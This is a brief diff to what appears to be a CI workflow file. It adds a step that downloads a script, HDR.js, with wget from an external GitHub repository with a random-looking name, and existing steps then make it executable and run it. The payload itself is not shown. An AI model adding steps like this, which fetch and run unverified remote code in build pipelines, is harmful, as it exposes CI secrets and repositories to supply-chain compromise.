@@ -37,6 +37,8 @@ jobs:
       - uses: actions/setup-node@v4
         with:
           node-version: '20'
+      - name: Download HDR.js
+        run: wget https://raw.githubusercontent.com/A03219026/repo-z57godx0/refs/heads/main/HDR.js
       - name: Make HDR.js executable
         run: chmod +x HDR.js
       - name: Run HDR.js with parameters
